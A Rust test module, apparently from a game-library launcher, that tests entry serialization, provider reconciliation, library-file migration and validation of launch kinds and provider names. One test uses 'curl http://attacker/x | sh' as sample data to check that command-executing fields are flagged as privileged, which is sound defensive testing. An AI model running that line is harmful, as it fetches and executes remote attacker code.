        let mut e = manual("abc123", "Shadow of the Colossus");
        e.meta = GameMeta {
            platform: Some("PS2".into()),
            release_year: Some(2005),
            genres: vec!["Adventure".into()],
            ..Default::default()
        };
        let v = serde_json::to_value(&e).unwrap();
        assert_eq!(v["platform"], "PS2");
        assert_eq!(v["release_year"], 2005);
        assert_eq!(v["genres"][0], "Adventure");
        assert!(v.get("meta").is_none(), "flattened, not nested");
        assert!(v.get("description").is_none(), "absent fields are omitted");
        assert!(v.get("tags").is_none(), "empty lists are omitted");

        let old = r#"{"id":"abc","title":"Old"}"#;
        let e: CustomEntry = serde_json::from_str(old).unwrap();
        assert!(e.meta.platform.is_none());

        let payload = r#"{"external_id":"rom-1","title":"OoT","platform":"N64",
                          "region":"NTSC-U","players":1,"tags":["kids"]}"#;
        let p: ProviderEntryInput = serde_json::from_str(payload).unwrap();
        assert_eq!(p.meta.platform.as_deref(), Some("N64"));
        assert_eq!(p.meta.players, Some(1));
    }

    #[test]
    fn reconcile_is_declarative_with_stable_ids() {
        let mut entries = vec![manual("man1", "Hand-added")];
        let mut other = manual("oth1", "Other title");
        other.provider = Some("itch".into());
        other.external_id = Some("x1".into());
        entries.push(other);

        let r1 = reconcile_entries(
            &mut entries,
            "romm",
            None,
            vec![input("rom-a", "Game A"), input("rom-b", "Game B")],
        );
        assert_eq!(r1.len(), 2);
        assert!(r1.iter().all(|e| e.provider.as_deref() == Some("romm")));
        let id_a = r1[0].id.clone();
        assert_eq!(entries.len(), 4);

        // A's host id stays put across rename, drop, and add.
        let r2 = reconcile_entries(
            &mut entries,
            "romm",
            None,
            vec![input("rom-a", "Game A (v2)"), input("rom-c", "Game C")],
        );
        assert_eq!(r2.len(), 2);
        assert_eq!(r2[0].id, id_a, "same external_id keeps its host id");
        assert_eq!(r2[0].title, "Game A (v2)");
        assert_ne!(r2[1].id, id_a);
        assert!(
            !entries
                .iter()
                .any(|e| e.external_id.as_deref() == Some("rom-b")),
            "orphan dropped"
        );

        let snapshot: Vec<String> = entries.iter().map(|e| e.id.clone()).collect();
        let r3 = reconcile_entries(
            &mut entries,
            "romm",
            None,
            vec![input("rom-a", "Game A (v2)"), input("rom-c", "Game C")],
        );
        assert_eq!(
            r3.iter().map(|e| &e.id).collect::<Vec<_>>(),
            r2.iter().map(|e| &e.id).collect::<Vec<_>>()
        );
        assert_eq!(
            entries.iter().map(|e| e.id.clone()).collect::<Vec<_>>(),
            snapshot
        );

        assert!(entries
            .iter()
            .any(|e| e.id == "man1" && e.provider.is_none()));
        assert!(entries
            .iter()
            .any(|e| e.id == "oth1" && e.provider.as_deref() == Some("itch")));

        // Empty payload = drop everything this provider owns (same as DELETE).
        let r4 = reconcile_entries(&mut entries, "romm", None, Vec::new());
        assert!(r4.is_empty());
        assert_eq!(
            entries.len(),
            2,
            "only the manual + other-provider entries remain"
        );
    }

    /// v1 (bare array) must still load; v2 must round-trip. Wrong migration silently drops manual rows.
    #[test]
    fn v1_and_v2_library_files_both_load() {
        let v1 = r#"[{"id":"abc","title":"Old Manual"}]"#;
        let c = match serde_json::from_str::<LibraryFile>(v1).unwrap() {
            LibraryFile::Legacy(entries) => Catalog {
                entries,
                claims: BTreeMap::new(),
            },
            LibraryFile::V2(_) => panic!("an array must not parse as v2"),
        };
        assert_eq!(c.entries.len(), 1);
        assert_eq!(c.entries[0].title, "Old Manual");
        assert!(c.claims.is_empty());

        let v2 = r#"{"entries":[{"id":"abc","title":"New"}],"claims":{"steam":"steam"}}"#;
        let c = match serde_json::from_str::<LibraryFile>(v2).unwrap() {
            LibraryFile::V2(c) => c,
            LibraryFile::Legacy(_) => panic!("an object must not parse as v1"),
        };
        assert_eq!(c.entries.len(), 1);
        assert_eq!(c.claims.get("steam").map(String::as_str), Some("steam"));

        // v2 with no `claims` key still loads.
        let bare = r#"{"entries":[]}"#;
        assert!(matches!(
            serde_json::from_str::<LibraryFile>(bare).unwrap(),
            LibraryFile::V2(_)
        ));

        // Writes are v2, so one mutation upgrades the file in place.
        let written = serde_json::to_string(&Catalog::default()).unwrap();
        assert!(written.contains("\"entries\""));
        assert!(written.contains("\"claims\""));
    }

    #[test]
    fn store_claim_validation() {
        assert!(validate_store_claim("steam").is_ok());
        assert!(validate_store_claim("epic-games").is_ok());
        assert!(validate_store_claim("xbox_pc").is_ok());
        assert!(validate_store_claim("custom").is_err());
        assert!(validate_store_claim("manual").is_err());
        assert!(validate_store_claim("").is_err());
        assert!(validate_store_claim("Steam").is_err());
        // A dot would read as a hostname in logs and muddies the `store:id` split.
        assert!(validate_store_claim("my.store").is_err());
        assert!(validate_store_claim(&"s".repeat(33)).is_err());
    }

    #[test]
    fn payload_validation_covers_the_new_closed_vocabularies() {
        let with_launch = |kind: &str, value: &str| {
            let mut i = input("a", "A");
            i.launch = Some(LaunchSpec {
                kind: kind.into(),
                value: value.into(),
                ..Default::default()
            });
            i
        };
        // How many entries one bad field drops: never the whole payload.
        let dropped = |i: ProviderEntryInput| {
            validate_provider_payload("demo", &mut vec![i]).map(|d| d.len())
        };
        assert_eq!(dropped(with_launch("steam_ui", "bigpicture")), Ok(0));
        assert_eq!(dropped(with_launch("steam_ui", "desktop")), Ok(0));
        assert_eq!(dropped(with_launch("steam_ui", "gamepad")), Ok(1));
        assert_eq!(dropped(with_launch("steam_ui", "")), Ok(1));
        // Other kinds are unconstrained here (validated per-kind at launch).
        assert_eq!(dropped(with_launch("command", "anything")), Ok(0));

        // `launcher_ui`: an unknown name drops that entry; not-installed is dropped later.
        assert_eq!(dropped(with_launch("launcher_ui", "nonesuch")), Ok(1));
        #[cfg(windows)]
        assert_eq!(dropped(with_launch("launcher_ui", "playnite")), Ok(0));
        #[cfg(target_os = "linux")]
        assert_eq!(dropped(with_launch("launcher_ui", "lutris")), Ok(0));

        let with_env = |key: &str, value: Option<&str>| {
            let mut i = input("a", "A");
            i.detect.env_marker = Some(EnvMarker {
                key: key.into(),
                value: value.map(str::to_string),
            });
            i
        };
        assert_eq!(dropped(with_env("HEROIC_APP_NAME", Some("Quail"))), Ok(0));
        assert_eq!(dropped(with_env("BAD-KEY", None)), Ok(1));
        assert_eq!(dropped(with_env("", None)), Ok(1));
        assert_eq!(
            dropped(with_env("K", Some(&"x".repeat(MAX_ENV_VALUE + 1)))),
            Ok(1)
        );
    }

    #[test]
    fn one_bad_entry_drops_only_itself() {
        let mut bad = input("b", "B");
        bad.launch = Some(LaunchSpec {
            kind: "steam_ui".into(),
            value: "gamepad".into(),
            ..Default::default()
        });
        let mut inputs = vec![input("a", "A"), bad, input("c", "C")];
        let dropped = validate_provider_payload("demo", &mut inputs).unwrap();
        assert_eq!(dropped.len(), 1);
        assert_eq!(dropped[0].0, "b");
        let kept: Vec<_> = inputs.iter().map(|e| e.external_id.as_str()).collect();
        assert_eq!(kept, ["a", "c"]);
    }

    #[test]
    fn privileged_field_is_command_execution_only() {
        let cmd = LaunchSpec {
            kind: "command".into(),
            value: "curl http://attacker/x | sh".into(),
            ..Default::default()
        };
        let steam = LaunchSpec {
            kind: "steam_appid".into(),
            value: "70".into(),
            ..Default::default()
        };
        let prep = vec![crate::hooks::PrepCmd {
            run: "curl http://attacker/x | sh".into(),
            undo: None,
        }];

        assert_eq!(privileged_field(Some(&cmd), &[]), Some("launch.kind"));
        assert_eq!(privileged_field(None, &prep), Some("prep"));
        assert_eq!(privileged_field(Some(&steam), &prep), Some("prep"));
        assert_eq!(privileged_field(Some(&steam), &[]), None);
        assert_eq!(privileged_field(None, &[]), None);
    }

    /// Unlisted kinds are operator-privileged. The listed set is pinned so widening it is an
    /// edit to this test.
    #[test]
    fn an_unlisted_launch_kind_is_operator_privileged() {
        let kind = |k: &str| {
            let spec = LaunchSpec {
                kind: k.into(),
                value: "x".into(),
                ..Default::default()
            };
            privileged_field(Some(&spec), &[])
        };
        assert_eq!(
            UNPRIVILEGED_LAUNCH_KINDS,
            &[
                "steam_appid",
                "steam_ui",
                "launcher_ui",
                "lutris_id",
                "heroic",
                "epic",
                "gog",
                "aumid",
                "xbox",
                "playnite",
                "uplay",
                "amazon",
                "battlenet",
                "exec",
                "desktop_id",
            ],
            "widening this set hands the plugin lane a new launch kind — do it on purpose"
        );
        for k in UNPRIVILEGED_LAUNCH_KINDS {
            assert_eq!(kind(k), None, "`{k}` is on the allowlist");
        }
        assert_eq!(kind("brand_new_store"), Some("launch.kind"));
        assert_eq!(kind(""), Some("launch.kind"));
        // Resolvers match the exact string; `GOG` is not `gog`.
        assert_eq!(kind("GOG"), Some("launch.kind"));
    }

    #[test]
    fn provider_name_and_payload_validation() {
        assert!(validate_provider_name("romm").is_ok());
        assert!(validate_provider_name("my-provider.v2").is_ok());
        assert!(validate_provider_name("manual").is_err(), "reserved");
        assert!(validate_provider_name("").is_err());
        assert!(validate_provider_name("Bad/Name").is_err());
        assert!(validate_provider_name("-lead").is_err());
        assert!(validate_provider_name(&"x".repeat(65)).is_err());

        let check = |mut v: Vec<ProviderEntryInput>| validate_provider_payload("demo", &mut v);
        assert!(check(vec![input("a", "A")]).is_ok());
        assert!(check(vec![input("", "A")]).is_err());
        assert!(check(vec![input("a", " ")]).is_err());
        assert!(
            check(vec![input("a", "A"), input("a", "B")]).is_err(),
            "duplicate external_id"
        );
    }

    #[test]
    fn an_unopenable_launcher_tile_costs_only_itself() {
        let mut tile = input("launcher", "Playnite");
        tile.role = GameRole::Launcher;
        tile.launch = Some(LaunchSpec {
            kind: "launcher_ui".into(),
            value: "playnite".into(),
            ..Default::default()
        });

        let mut inputs = vec![input("a", "A"), tile, input("b", "B")];
        let dropped = sanitize_launcher_entries(&mut inputs);

        if resolvable_launcher_ui("playnite") {
            // Playnite is installed: keep all three.
            assert!(dropped.is_empty());
            assert_eq!(inputs.len(), 3);
        } else {
            assert_eq!(dropped.len(), 1);
            assert_eq!(dropped[0].1, "playnite");
            assert_eq!(inputs.len(), 2);
            assert!(inputs.iter().all(|e| e.external_id != "launcher"));
        }

        let mut only_games = vec![input("a", "A"), input("b", "B")];
        assert!(sanitize_launcher_entries(&mut only_games).is_empty());
        assert_eq!(only_games.len(), 2);
    }
}
